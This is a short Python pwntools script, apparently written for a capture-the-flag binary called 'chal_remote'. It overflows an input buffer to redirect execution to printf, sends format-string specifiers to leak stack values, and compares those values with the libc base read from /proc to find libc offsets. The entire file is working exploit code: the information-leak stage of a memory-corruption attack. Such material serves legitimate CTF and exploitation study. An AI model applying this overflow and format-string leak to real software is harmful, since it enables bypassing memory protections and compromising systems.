#!/usr/bin/env python3
import os,time,re
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
PRINTF=0x4010d4

def leak_pos(n):
    p=process("/work/waf/waf/chal_remote")
    p.recvuntil(b">> ")
    pay=(b"exit"+b"["+("%%%d$p"%n).encode()+b"]").ljust(88,b"A")+p64(PRINTF)
    p.send(pay); time.sleep(0.15)
    # read libc base from /proc before it dies
    lb=None
    try:
        maps=open(f"/proc/{p.pid}/maps").read()
        for l in maps.splitlines():
            if "libc.so.6" in l:
                b=int(l.split('-')[0],16); lb=b if lb is None else min(lb,b)
    except: pass
    try: out=p.recv(timeout=0.6)
    except: out=b""
    p.close()
    m=re.search(rb"\[(0x[0-9a-f]+|\(nil\))\]",out)
    val=m.group(1).decode() if m else "?"
    off = (int(val,16)-lb) if (val.startswith("0x") and lb) else None
    return val, lb, off

for n in range(5,40):
    v,lb,off=leak_pos(n)
    tag=""
    if v.startswith("0x7f"): tag=f"  <== LIBC? off={hex(off) if off else '?'}"
    print(f"%{n}$p = {v}{tag}")
